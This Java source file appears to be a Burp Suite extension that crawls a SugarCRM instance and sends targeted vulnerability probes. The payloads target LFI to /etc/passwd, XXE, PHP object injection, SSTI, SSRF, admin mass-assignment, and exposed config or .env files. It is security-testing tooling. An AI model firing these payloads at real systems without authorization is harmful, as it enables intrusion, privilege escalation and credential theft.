package burp.extension.orchestrator;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.BuiltInAuditConfiguration;
import burp.extension.ExtensionConfig;
import burp.extension.auth.AuthManager;
import burp.extension.crawler.ModuleCrawler;
import burp.extension.simulator.UserActionSimulator;
import burp.extension.ui.IntrusiveApprovalCallback;
import burp.extension.ui.IntrusiveApprovalCallback.Decision;
import burp.extension.ui.TestCase;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.function.Consumer;

/**
 * ScanOrchestrator ties all components together and drives the scan sequence:
 *
 *  Phase 1  – Crawl all SugarCRM modules and REST endpoints
 *  Phase 2  – Simulate user actions (CRUD, upload, import, export, admin)
 *  Phase 3  – Submit every discovered URL to Burp's active scanner
 *  Phase 4  – Direct CVE / targeted vulnerability probes
 *
 * Each phase is filtered by the user's TestCase selection in the UI.
 * Intrusive tests show a confirmation dialog before executing (unless
 * auto-approve is enabled in config).
 *
 * Browser simulation mode narrates each action in the log in the style of
 * a real-user Chromium session to make the output easier to follow.
 */
public class ScanOrchestrator {

    private final MontoyaApi      api;
    private final ExtensionConfig config;
    private final AuthManager     authManager;
    private final ModuleCrawler   crawler;

    private final AtomicBoolean running  = new AtomicBoolean(false);
    private ExecutorService executor;

    private static final int SCAN_THREADS = 4;

    // Tracks whether the user selected "Skip All Intrusive" during this run
    private final AtomicBoolean skipAllIntrusive = new AtomicBoolean(false);

    public ScanOrchestrator(MontoyaApi api, ExtensionConfig config,
                             AuthManager authManager, ModuleCrawler crawler) {
        this.api         = api;
        this.config      = config;
        this.authManager = authManager;
        this.crawler     = crawler;
    }

    // ─── Public entry point ───────────────────────────────────────────────────

    /** Convenience overload — no intrusive approval (auto-approve all). */
    public void startScan(Consumer<String> logger) {
        startScan(logger, tc -> Decision.APPROVE);
    }

    /**
     * Start the full scan.  Blocks until complete (call from a background thread).
     *
     * @param logger   progress messages shown in the UI log
     * @param approval callback invoked before each intrusive test
     */
    public void startScan(Consumer<String> logger, IntrusiveApprovalCallback approval) {
        if (!running.compareAndSet(false, true)) {
            logger.accept("[Orchestrator] Scan already running.");
            return;
        }
        skipAllIntrusive.set(false);
        executor = Executors.newFixedThreadPool(SCAN_THREADS);

        try {
            logger.accept("[Orchestrator] === SugarCRM Automated Scan v2.0 ===");
            logger.accept("[Orchestrator] Target : " + config.getTargetUrl());
            logger.accept("[Orchestrator] User   : " + config.getUsername());
            logger.accept("[Orchestrator] Enabled test cases: "
                + config.getEnabledTestCases().size() + " selected");

            // ── Phase 1: Crawl ────────────────────────────────────────────────
            logger.accept("\n[Phase 1] Crawling SugarCRM modules and REST endpoints...");
            List<HttpRequest> crawlRequests = new ArrayList<>();

            if (isEnabled(TestCase.CRAWL_WEB_MODULES) || isEnabled(TestCase.CRAWL_REST_API)
                    || isEnabled(TestCase.CRAWL_EXTRACT_LINKS) || isEnabled(TestCase.CRAWL_IDOR_ENUM)) {
                crawlRequests = crawler.crawl(logger);
                logger.accept("[Phase 1] Complete — " + crawlRequests.size() + " requests collected.");
            } else {
                logger.accept("[Phase 1] Skipped (no crawl test cases selected).");
            }

            if (!running.get()) { logger.accept("[Orchestrator] Stopped."); return; }

            // ── Phase 2: Simulate user actions ───────────────────────────────
            List<HttpRequest> allRequests = new ArrayList<>(crawlRequests);
            if (config.isSimulateUserActions() && hasAnySimulationTestEnabled()) {
                logger.accept("\n[Phase 2] Simulating user actions...");
                if (config.isShowBrowserSimulation()) {
                    browserNarrate(logger, "Opening SugarCRM in browser...",
                        "Navigating to: " + config.getTargetUrl());
                }
                UserActionSimulator simulator = new UserActionSimulator(api, config);
                // Check intrusive approval for simulation actions that need it
                if (shouldRunIntrusive(TestCase.SIM_CRUD_RECORDS, logger, approval)) {
                    List<HttpRequest> simRequests = simulator.simulate(logger);
                    allRequests.addAll(simRequests);
                    logger.accept("[Phase 2] Complete — " + simRequests.size() + " action requests generated.");
                } else {
                    logger.accept("[Phase 2] Simulation skipped (intrusive test declined).");
                }
            } else {
                logger.accept("[Phase 2] Skipped (simulation disabled or no simulation tests selected).");
            }

            if (!running.get()) { logger.accept("[Orchestrator] Stopped."); return; }

            // ── Phase 3: Pass to Burp Scanner ─────────────────────────────────
            if (config.isActivelyPassToBurpScanner() && !allRequests.isEmpty()) {
                logger.accept("\n[Phase 3] Submitting " + allRequests.size()
                        + " requests to Burp Active Scanner...");
                submitToBurpScanner(allRequests, logger);
            } else {
                logger.accept("[Phase 3] Skipped (pass to Burp Scanner is disabled or no requests).");
            }

            // ── Phase 4: CVE / Targeted Probes ───────────────────────────────
            logger.accept("\n[Phase 4] Running targeted SugarCRM vulnerability probes...");
            runCveProbes(logger, approval);

            logger.accept("\n[Orchestrator] === Scan Complete ===");
            logSummary(allRequests.size(), logger);

        } catch (Exception e) {
            logger.accept("[Orchestrator] ERROR: " + e.getMessage());
            api.logging().logToError("[Orchestrator] " + e.getMessage());
        } finally {
            running.set(false);
            if (executor != null) executor.shutdown();
        }
    }

    public void shutdown() {
        running.set(false);
        if (executor != null && !executor.isShutdown()) executor.shutdownNow();
    }

    // ─── Phase 3: Burp Scanner integration ───────────────────────────────────

    private void submitToBurpScanner(List<HttpRequest> requests, Consumer<String> logger) {
        int submitted = 0, skipped = 0;

        for (HttpRequest req : requests) {
            if (!running.get()) break;
            try {
                HttpRequestResponse rr = api.http().sendRequest(req);
                if (rr.response() != null) api.siteMap().add(rr);
                submitted++;
                if (submitted % 50 == 0) {
                    logger.accept("[Phase 3] Added " + submitted + "/" + requests.size() + " to site map...");
                }
            } catch (Exception e) {
                skipped++;
            }
        }

        if (submitted > 0) {
            try {
                api.scanner().startAudit(
                    burp.api.montoya.scanner.AuditConfiguration.auditConfiguration(
                        BuiltInAuditConfiguration.LEGACY_ACTIVE_AUDIT_CHECKS));
                logger.accept("[Phase 3] Active audit started on " + submitted + " in-scope items.");
            } catch (Exception e) {
                logger.accept("[Phase 3] Could not start active audit: " + e.getMessage());
            }
        }
        logger.accept("[Phase 3] Done. Submitted: " + submitted + ", Skipped: " + skipped);
    }

    // ─── Phase 4: CVE / Targeted Probes ──────────────────────────────────────

    private void runCveProbes(Consumer<String> logger, IntrusiveApprovalCallback approval) {
        List<CveProbe> probes = buildCveProbes();
        int found = 0, total = 0;

        for (CveProbe probe : probes) {
            if (!running.get()) break;

            // Skip if not in selected test cases
            if (probe.testCase != null && !isEnabled(probe.testCase)) {
                logger.accept("[CVE Probe] SKIPPED (not selected): " + probe.name);
                continue;
            }

            // Intrusive approval check
            if (probe.testCase != null && probe.testCase.intrusive) {
                if (!shouldRunIntrusive(probe.testCase, logger, approval)) {
                    logger.accept("[CVE Probe] Skipped (intrusive): " + probe.name);
                    continue;
                }
            }

            total++;
            if (config.isShowBrowserSimulation() && probe.testCase != null) {
                browserNarrate(logger, "Running probe: " + probe.name,
                    "Sending " + probe.request.method() + " " + probe.request.url());
            }

            try {
                HttpRequestResponse resp = api.http().sendRequest(probe.request);
                if (resp.response() == null) continue;
                int    status  = resp.response().statusCode();
                String body    = resp.response().bodyToString();

                boolean triggered = false;
                for (String indicator : probe.successIndicators) {
                    if (body.contains(indicator)) { triggered = true; break; }
                }
                if (probe.expectedStatus > 0 && status == probe.expectedStatus) triggered = true;

                if (triggered) {
                    found++;
                    logger.accept("[CVE Probe] *** POTENTIAL HIT *** — " + probe.name
                            + " | HTTP " + status + " | " + probe.request.url());
                    api.siteMap().add(resp);
                } else {
                    logger.accept("[CVE Probe] " + probe.name + " — Not triggered (HTTP " + status + ")");
                }
            } catch (Exception e) {
                logger.accept("[CVE Probe] " + probe.name + " — Error: " + e.getMessage());
            }
        }

        logger.accept("[Phase 4] Probes complete. " + found + "/" + total + " potential hits.");
    }

    // ─── Probe definitions ────────────────────────────────────────────────────

    private List<CveProbe> buildCveProbes() {
        List<CveProbe> probes = new ArrayList<>();
        String base    = config.getTargetUrl();
        String session = config.getSessionCookie();
        String token   = config.getSugarToken();

        // ── Unauthenticated access ──────────────────────────────────────────
        probes.add(new CveProbe(
            "Unauthenticated REST API Access",
            get(base + "/api/v8/Accounts", null),
            List.of("\"total_count\"", "\"id\""), 0,
            TestCase.CVE_UNAUTH_ADMIN));

        probes.add(new CveProbe(
            "Unauthenticated Admin Page",
            get(base + "/index.php?module=Administration&action=index", null),
            List.of("Password Manager", "Repair", "UpgradeWizard"), 200,
            TestCase.CVE_UNAUTH_ADMIN));

        // ── CVE-2023-22952 ──────────────────────────────────────────────────
        probes.add(new CveProbe(
            "CVE-2023-22952 — Pre-Auth RCE via EmailTemplate (probe)",
            post(base + "/index.php?module=EmailTemplates&action=Save",
                 "module=EmailTemplates&action=Save"
                 + "&body_html=<img+src%3Dx+onerror%3Dphpinfo()>", session),
            List.of("PHP Version", "phpinfo", "System"), 0,
            TestCase.CVE_2023_22952));

        // ── CVE-2021-45229 ──────────────────────────────────────────────────
        probes.add(new CveProbe(
            "CVE-2021-45229 — Auth Bypass Token Probe",
            get(base + "/index.php?module=Users&action=DetailView&record=1&token=ignored", null),
            List.of("user_name", "first_name", "is_admin"), 200,
            TestCase.CVE_2021_45229));

        // ── CVE-2020-15301 ──────────────────────────────────────────────────
        probes.add(new CveProbe(
            "CVE-2020-15301 — SSRF via Email Transport Config",
            post(base + "/index.php?module=Administration&action=Save",
                 "module=Administration&action=Save"
                 + "&smtp_host=http://127.0.0.1&smtp_port=80"
                 + "&sugar_token=" + token, session),
            List.of("smtp_host", "SMTP", "Connection refused"), 0,
            TestCase.CVE_2020_15301));

        // ── LFI via module / action parameters ─────────────────────────────
        probes.add(new CveProbe(
            "LFI via module parameter",
            get(base + "/index.php?module=../../etc/passwd%00&action=index", session),
            List.of("root:x:0:0"), 0,
            TestCase.CVE_LFI_MODULE));

        probes.add(new CveProbe(
            "LFI via action parameter",
            get(base + "/index.php?module=Home&action=../../etc/passwd", session),
            List.of("root:x:0:0"), 0,
            TestCase.CVE_LFI_MODULE));

        // ── PHP Object Injection via cookie ─────────────────────────────────
        probes.add(new CveProbe(
            "PHP Object Injection via sugar_user_theme cookie",
            getWithCookie(base + "/index.php?module=Home&action=index",
                "sugar_user_theme=O:8:\"stdClass\":1:{s:3:\"cmd\";s:2:\"id\"};"),
            List.of("uid=", "gid=", "groups="), 0,
            TestCase.CVE_OBJECT_INJECTION));

        // ── REST API Mass Assignment ─────────────────────────────────────────
        probes.add(new CveProbe(
            "REST API Mass Assignment — is_admin escalation",
            restPatch(base + "/api/v8/Users/" + config.getUsername(),
                "{\"is_admin\":\"1\",\"user_type\":\"Administrator\"}"),
            List.of("\"is_admin\":\"1\"", "\"user_type\":\"Administrator\""), 0,
            TestCase.CVE_OBJECT_INJECTION));

        // ── CVE-2022-21712: XSS in QuickSearch ─────────────────────────────
        probes.add(new CveProbe(
            "CVE-2022-21712 — XSS in Quick-Search",
            get(base + "/index.php?module=Home&action=UnifiedSearch"
                + "&query=true&search_name=<script>alert(1)</script>", session),
            List.of("<script>alert(1)</script>"), 0,
            TestCase.CVE_2022_21712));

        // ── Config / log file exposure ──────────────────────────────────────
        probes.add(new CveProbe(
            "config.php accessible from web root",
            get(base + "/config.php", session),
            List.of("db_host_name", "db_user_name", "db_password"), 200,
            TestCase.CVE_CONFIG_EXPOSURE));

        probes.add(new CveProbe(
            "config_override.php accessible",
            get(base + "/config_override.php", session),
            List.of("sugar_config", "db_host"), 200,
            TestCase.CVE_CONFIG_EXPOSURE));

        probes.add(new CveProbe(
            "install.php accessible (post-install)",
            get(base + "/install.php", null),
            List.of("SugarCRM Installation Wizard", "Setup Wizard"), 200,
            TestCase.CVE_CONFIG_EXPOSURE));

        probes.add(new CveProbe(
            "sugarcrm.log accessible from web root",
            get(base + "/sugarcrm.log", null),
            List.of("[SugarCRM]", "FATAL", "MySQL"), 200,
            TestCase.CVE_LOG_EXPOSURE));

        probes.add(new CveProbe(
            ".git directory exposed",
            get(base + "/.git/config", null),
            List.of("[core]", "repositoryformatversion"), 200,
            TestCase.CVE_GIT_EXPOSURE));

        // ── Smarty SSTI via EmailTemplate ───────────────────────────────────
        probes.add(new CveProbe(
            "Smarty SSTI via EmailTemplate body_html",
            post(base + "/index.php?module=EmailTemplates&action=Save",
                 "module=EmailTemplates&action=Save&name=SSTIProbe"
                 + "&body_html={math+equation%3D\"7*7\"}"
                 + "&sugar_token=" + token, session),
            List.of("49"), 0,
            TestCase.INJ_SSTI));

        // ── Workflow SSTI (AOW) ─────────────────────────────────────────────
        probes.add(new CveProbe(
            "Smarty SSTI via AOW_WorkFlow action field",
            post(base + "/index.php?module=AOW_WorkFlow&action=Save",
                 "module=AOW_WorkFlow&action=Save&name=SSTITest"
                 + "&conditions%5B0%5D%5Bfield%5D=name"
                 + "&conditions%5B0%5D%5Bvalue%5D={math+equation%3D\"6*7\"}"
                 + "&sugar_token=" + token, session),
            List.of("42"), 0,
            TestCase.CVE_WORKFLOW_SSTI));

        // ── Module Loader upload ────────────────────────────────────────────
        probes.add(new CveProbe(
            "ModuleLoader upload endpoint accessible",
            get(base + "/index.php?module=ModuleLoader&action=index", session),
            List.of("Upload Package", "module_zip", "ModuleLoader"), 200,
            TestCase.CVE_MODULE_LOADER));

        // ── SSRF via webhook/callback ───────────────────────────────────────
        probes.add(new CveProbe(
            "SSRF via Campaign Tracker URL",
            post(base + "/index.php?module=Campaigns&action=Save",
                 "module=Campaigns&action=Save&name=SSRFProbe"
                 + "&tracker_urls%5B0%5D%5Btracker_url%5D=http%3A%2F%2F127.0.0.1%3A22"
                 + "&sugar_token=" + token, session),
            List.of("ssh", "OpenSSH", "Connection refused"), 0,
            TestCase.INJ_SSRF));

        // ── XXE via vCard import ────────────────────────────────────────────
        String xxeVcard = "BEGIN:VCARD\r\nVERSION:3.0\r\n"
            + "FN:<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>\r\n"
            + "END:VCARD";
        probes.add(new CveProbe(
            "XXE via vCard import",
            buildMultipart(base + "/index.php?module=Contacts&action=vCardSave",
                           session, xxeVcard, "probe.vcf"),
            List.of("root:x:0:0", "/bin/bash"), 0,
            TestCase.INJ_XXE));

        // ── Sensitive backup files ──────────────────────────────────────────
        for (String bak : List.of("/config.php.bak", "/backup/", "/dump.sql",
                "/sugarcrm_archive.zip", "/.env", "/phpinfo.php")) {
            probes.add(new CveProbe(
                "Sensitive file: " + bak,
                get(base + bak, null),
                List.of("db_host", "password", "DB_PASSWORD", "PHP Version",
                        "central directory", "mysqldump"), 200,
                TestCase.CVE_CONFIG_EXPOSURE));
        }

        return probes;
    }

    // ─── Helpers: test case / intrusive checks ────────────────────────────────

    private boolean isEnabled(TestCase tc) {
        return config.isTestCaseEnabled(tc);
    }

    private boolean hasAnySimulationTestEnabled() {
        return isEnabled(TestCase.SIM_CRUD_RECORDS)  || isEnabled(TestCase.SIM_SEARCH)
            || isEnabled(TestCase.SIM_IMPORT_VCARD)  || isEnabled(TestCase.SIM_IMPORT_CSV)
            || isEnabled(TestCase.SIM_PASSWORD_CHANGE) || isEnabled(TestCase.SIM_EMAIL_COMPOSE)
            || isEnabled(TestCase.SIM_ADMIN_ACTIONS);
    }

    /**
     * Returns true if the given intrusive test case should run.
     * Handles the skipAllIntrusive flag and calls the approval callback.
     */
    private boolean shouldRunIntrusive(TestCase tc, Consumer<String> logger,
                                       IntrusiveApprovalCallback approval) {
        if (!tc.intrusive) return true;
        if (skipAllIntrusive.get()) {
            logger.accept("[Intrusive] All intrusive tests skipped.");
            return false;
        }
        if (config.isAutoApproveIntrusive()) {
            logger.accept("[Intrusive] Auto-approved: " + tc.displayName);
            return true;
        }

        Decision d = approval.ask(tc);
        switch (d) {
            case APPROVE  -> { logger.accept("[Intrusive] Approved: " + tc.displayName); return true; }
            case SKIP_ALL -> {
                skipAllIntrusive.set(true);
                logger.accept("[Intrusive] User selected SKIP ALL intrusive tests.");
                return false;
            }
            default       -> { logger.accept("[Intrusive] Skipped: " + tc.displayName); return false; }
        }
    }

    // ─── Browser simulation narration ─────────────────────────────────────────

    /**
     * Logs browser-style narration lines when showBrowserSimulation is on.
     * Mimics what a Chromium browser would show to the user.
     */
    private void browserNarrate(Consumer<String> logger, String... steps) {
        if (!config.isShowBrowserSimulation()) return;
        for (String step : steps) {
            logger.accept("[Browser] " + step);
        }
    }

    // ─── Summary ─────────────────────────────────────────────────────────────

    private void logSummary(int totalRequests, Consumer<String> logger) {
        logger.accept("─────────────────────────────────────────────────────");
        logger.accept("  SugarCRM Scanner v2.0 — Scan Summary");
        logger.accept("  Target:            " + config.getTargetUrl());
        logger.accept("  Total requests:    " + totalRequests);
        logger.accept("  Intrusive tests:   " + (skipAllIntrusive.get() ? "Some/All SKIPPED" : "Ran as configured"));
        logger.accept("  Check Burp Scanner Issues tab for findings.");
        logger.accept("  Check Burp Site Map for all discovered endpoints.");
        logger.accept("─────────────────────────────────────────────────────");
    }

    // ─── Request helpers ──────────────────────────────────────────────────────

    private HttpRequest get(String url, String cookie) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/2.0)");
        if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
        return r;
    }

    private HttpRequest getWithCookie(String url, String cookieValue) {
        return HttpRequest.httpRequestFromUrl(url)
                .withMethod("GET")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/2.0)")
                .withHeader("Cookie", cookieValue + "; " + config.getSessionCookie());
    }

    private HttpRequest post(String url, String body, String cookie) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("POST")
                .withHeader("Content-Type", "application/x-www-form-urlencoded")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/2.0)")
                .withBody(body);
        if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
        return r;
    }

    private HttpRequest restPatch(String url, String body) {
        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("PATCH")
                .withHeader("Content-Type", "application/json")
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/2.0)")
                .withBody(body);
        if (!config.getOauthToken().isBlank())
            r = r.withHeader("Authorization", "Bearer " + config.getOauthToken());
        return r;
    }

    /** Simple multipart/form-data request builder for file upload probes. */
    private HttpRequest buildMultipart(String url, String cookie,
                                        String content, String filename) {
        String boundary = "----SugarCRMBurpBoundary7Ma4YWxkTrZu0gW";
        String multipartBody = "--" + boundary + "\r\n"
            + "Content-Disposition: form-data; name=\"vcard_file\"; filename=\"" + filename + "\"\r\n"
            + "Content-Type: text/vcard\r\n\r\n"
            + content + "\r\n"
            + "--" + boundary + "--\r\n";

        HttpRequest r = HttpRequest.httpRequestFromUrl(url)
                .withMethod("POST")
                .withHeader("Content-Type", "multipart/form-data; boundary=" + boundary)
                .withHeader("User-Agent", "Mozilla/5.0 (SugarCRM-BurpScanner/2.0)")
                .withBody(multipartBody);
        if (cookie != null && !cookie.isBlank()) r = r.withHeader("Cookie", cookie);
        return r;
    }

    // ─── Inner record for probes ──────────────────────────────────────────────

    private static class CveProbe {
        final String       name;
        final HttpRequest  request;
        final List<String> successIndicators;
        final int          expectedStatus;
        final TestCase     testCase; // null = always run

        CveProbe(String name, HttpRequest request,
                 List<String> successIndicators, int expectedStatus,
                 TestCase testCase) {
            this.name              = name;
            this.request           = request;
            this.successIndicators = successIndicators;
            this.expectedStatus    = expectedStatus;
            this.testCase          = testCase;
        }
    }
}
